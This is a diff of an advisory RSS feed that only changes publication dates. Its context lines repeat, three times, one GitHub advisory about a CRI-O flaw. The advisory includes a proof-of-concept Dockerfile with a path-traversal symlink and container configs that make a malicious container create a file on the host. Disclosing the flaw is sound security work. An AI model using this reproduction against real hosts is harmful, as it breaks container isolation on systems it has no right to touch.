@@ -4,7 +4,7 @@
     <link>https://raw.githubusercontent.com/ssst0n3/GHSA-NOTIFY/main/output/feed.xml</link>
     <description></description>
     <managingEditor>ssst0n3@gmail.com (ssst0n3)</managingEditor>
-    <pubDate>Mon, 08 Jul 2024 16:00:29 +0000</pubDate>
+    <pubDate>Wed, 17 Jul 2024 06:35:06 +0000</pubDate>
     <item>
       <title>Path Traversal in Docker</title>
       <link>https://github.com/advisories/GHSA-vj3f-3286-r4pf</link>
@@ -471,19 +471,19 @@
       <title>malicious container creates symlink &#34;mtab&#34; on the host External</title>
       <link>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</link>
       <description>### Impact&#xA;A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.&#xA;&#xA;A workload built from this Dockerfile:&#xA;```&#xA;FROM docker.io/library/busybox as source&#xA;RUN mkdir /extra &amp;&amp; cd /extra &amp;&amp; ln -s ../../../../../../../../root etc&#xA;&#xA;FROM scratch&#xA;&#xA;COPY --from=source /bin /bin&#xA;COPY --from=source /lib /lib&#xA;COPY --from=source /extra .&#xA;&#xA;```&#xA;&#xA;and this container config:&#xA;&#xA;```&#xA;{&#xA;  &#34;metadata&#34;: {&#xA;      &#34;name&#34;: &#34;busybox&#34;&#xA;  },&#xA;  &#34;image&#34;:{&#xA;      &#34;image&#34;: &#34;localhost/test&#34;&#xA;  },&#xA;  &#34;command&#34;: [&#xA;      &#34;/bin/true&#34;&#xA;  ],&#xA;  &#34;linux&#34;: {&#xA;  }&#xA;}&#xA;&#xA;&#xA;```&#xA;and this sandbox config  &#xA;```&#xA;{&#xA;  &#34;metadata&#34;: {&#xA;    &#34;name&#34;: &#34;test-sandbox&#34;,&#xA;    &#34;namespace&#34;: &#34;default&#34;,&#xA;    &#34;attempt&#34;: 1,&#xA;    &#34;uid&#34;: &#34;edishd83djaideaduwk28bcsb&#34;&#xA;  },&#xA;  &#34;linux&#34;: {&#xA;    &#34;security_context&#34;: {&#xA;      &#34;namespace_options&#34;: {&#xA;        &#34;network&#34;: 2&#xA;      }&#xA;    }&#xA;  }&#xA;}&#xA;&#xA;```&#xA;&#xA;will create a file on host `/host/mtab`&#xA;&#xA;### Patches&#xA;1.30.1, 1.29.5, 1.28.7&#xA;&#xA;### Workarounds&#xA;Unfortunately not&#xA;&#xA;### References&#xA;_Are there any links users can visit to find out more?_&#xA;</description>
-      <pubDate>Thu, 27 Jun 2024 06:32:47 +0000</pubDate>
+      <pubDate>Wed, 17 Jul 2024 06:31:47 +0000</pubDate>
     </item>
     <item>
       <title>malicious container creates symlink &#34;mtab&#34; on the host External</title>
       <link>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</link>
       <description>### Impact&#xA;A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.&#xA;&#xA;A workload built from this Dockerfile:&#xA;```&#xA;FROM docker.io/library/busybox as source&#xA;RUN mkdir /extra &amp;&amp; cd /extra &amp;&amp; ln -s ../../../../../../../../root etc&#xA;&#xA;FROM scratch&#xA;&#xA;COPY --from=source /bin /bin&#xA;COPY --from=source /lib /lib&#xA;COPY --from=source /extra .&#xA;&#xA;```&#xA;&#xA;and this container config:&#xA;&#xA;```&#xA;{&#xA;  &#34;metadata&#34;: {&#xA;      &#34;name&#34;: &#34;busybox&#34;&#xA;  },&#xA;  &#34;image&#34;:{&#xA;      &#34;image&#34;: &#34;localhost/test&#34;&#xA;  },&#xA;  &#34;command&#34;: [&#xA;      &#34;/bin/true&#34;&#xA;  ],&#xA;  &#34;linux&#34;: {&#xA;  }&#xA;}&#xA;&#xA;&#xA;```&#xA;and this sandbox config  &#xA;```&#xA;{&#xA;  &#34;metadata&#34;: {&#xA;    &#34;name&#34;: &#34;test-sandbox&#34;,&#xA;    &#34;namespace&#34;: &#34;default&#34;,&#xA;    &#34;attempt&#34;: 1,&#xA;    &#34;uid&#34;: &#34;edishd83djaideaduwk28bcsb&#34;&#xA;  },&#xA;  &#34;linux&#34;: {&#xA;    &#34;security_context&#34;: {&#xA;      &#34;namespace_options&#34;: {&#xA;        &#34;network&#34;: 2&#xA;      }&#xA;    }&#xA;  }&#xA;}&#xA;&#xA;```&#xA;&#xA;will create a file on host `/host/mtab`&#xA;&#xA;### Patches&#xA;1.30.1, 1.29.5, 1.28.7&#xA;&#xA;### Workarounds&#xA;Unfortunately not&#xA;&#xA;### References&#xA;_Are there any links users can visit to find out more?_&#xA;</description>
-      <pubDate>Thu, 27 Jun 2024 06:32:47 +0000</pubDate>
+      <pubDate>Wed, 17 Jul 2024 06:31:47 +0000</pubDate>
     </item>
     <item>
       <title>malicious container creates symlink &#34;mtab&#34; on the host External</title>
       <link>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</link>
       <description>### Impact&#xA;A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.&#xA;&#xA;A workload built from this Dockerfile:&#xA;```&#xA;FROM docker.io/library/busybox as source&#xA;RUN mkdir /extra &amp;&amp; cd /extra &amp;&amp; ln -s ../../../../../../../../root etc&#xA;&#xA;FROM scratch&#xA;&#xA;COPY --from=source /bin /bin&#xA;COPY --from=source /lib /lib&#xA;COPY --from=source /extra .&#xA;&#xA;```&#xA;&#xA;and this container config:&#xA;&#xA;```&#xA;{&#xA;  &#34;metadata&#34;: {&#xA;      &#34;name&#34;: &#34;busybox&#34;&#xA;  },&#xA;  &#34;image&#34;:{&#xA;      &#34;image&#34;: &#34;localhost/test&#34;&#xA;  },&#xA;  &#34;command&#34;: [&#xA;      &#34;/bin/true&#34;&#xA;  ],&#xA;  &#34;linux&#34;: {&#xA;  }&#xA;}&#xA;&#xA;&#xA;```&#xA;and this sandbox config  &#xA;```&#xA;{&#xA;  &#34;metadata&#34;: {&#xA;    &#34;name&#34;: &#34;test-sandbox&#34;,&#xA;    &#34;namespace&#34;: &#34;default&#34;,&#xA;    &#34;attempt&#34;: 1,&#xA;    &#34;uid&#34;: &#34;edishd83djaideaduwk28bcsb&#34;&#xA;  },&#xA;  &#34;linux&#34;: {&#xA;    &#34;security_context&#34;: {&#xA;      &#34;namespace_options&#34;: {&#xA;        &#34;network&#34;: 2&#xA;      }&#xA;    }&#xA;  }&#xA;}&#xA;&#xA;```&#xA;&#xA;will create a file on host `/host/mtab`&#xA;&#xA;### Patches&#xA;1.30.1, 1.29.5, 1.28.7&#xA;&#xA;### Workarounds&#xA;Unfortunately not&#xA;&#xA;### References&#xA;_Are there any links users can visit to find out more?_&#xA;</description>
-      <pubDate>Thu, 27 Jun 2024 06:32:47 +0000</pubDate>
+      <pubDate>Wed, 17 Jul 2024 06:31:47 +0000</pubDate>
     </item>
     <item>
       <title>CRI-O vulnerable to an arbitrary systemd property injection</title>
